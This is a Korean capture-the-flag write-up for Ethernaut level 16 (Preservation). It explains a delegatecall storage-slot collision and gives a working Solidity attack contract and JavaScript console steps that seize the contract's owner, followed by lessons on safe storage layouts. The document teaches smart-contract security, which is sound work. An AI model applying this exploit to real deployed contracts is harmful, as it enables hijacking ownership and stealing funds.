# Ethernaut Level 16 - Preservation

## 문제 설명

`delegatecall`과 스토리지 레이아웃의 불일치를 이용해 소유권을 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract LibraryContract {
    uint storedTime;  // slot 0

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract Preservation {
    address public timeZone1Library;  // slot 0
    address public timeZone2Library;  // slot 1
    address public owner;             // slot 2
    uint storedTime;                  // slot 3

    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}
```

---

## 취약점 분석

### delegatecall의 스토리지 슬롯 충돌

```
LibraryContract.storedTime → slot 0
Preservation.timeZone1Library → slot 0  ← 같은 슬롯!
```

`setTime(_time)` 실행 시 **LibraryContract의 slot 0**이 아닌
**Preservation의 slot 0 (`timeZone1Library`)** 가 수정된다.

### 2단계 공격 흐름

```
1단계: setFirstTime(공격컨트랙트주소)
→ timeZone1Library가 공격 컨트랙트 주소로 변경

2단계: 다시 setFirstTime() 호출
→ 이제 공격 컨트랙트의 setTime() 실행
→ 공격 컨트랙트의 setTime에서 slot 2 (owner) 수정
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    address public slot0;  // slot 0 (맞춤용)
    address public slot1;  // slot 1 (맞춤용)
    address public owner;  // slot 2 ← Preservation의 owner와 같은 슬롯

    function setTime(uint _time) public {
        owner = tx.origin;  // slot 2 수정 → Preservation의 owner 변경
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

### Step 2 — 1차 호출: timeZone1Library 교체

```js
// 공격 컨트랙트 주소를 uint256으로 변환
let attackAddr = "공격컨트랙트주소"
let addrUint = BigInt(attackAddr)
await contract.setFirstTime(addrUint.toString())
```

### Step 3 — 2차 호출: owner 탈취

```js
await contract.setFirstTime(1)
```

### Step 4 — 확인

```js
await contract.owner()
// → 내 지갑 주소
```

---

## 핵심 교훈

- `delegatecall`을 사용하는 라이브러리는 **동일한 스토리지 레이아웃**이어야 함
- 슬롯 불일치로 의도치 않은 변수가 덮어씌워질 수 있음
- OpenZeppelin의 `TransparentUpgradeableProxy` 등 안전한 패턴 사용 권장
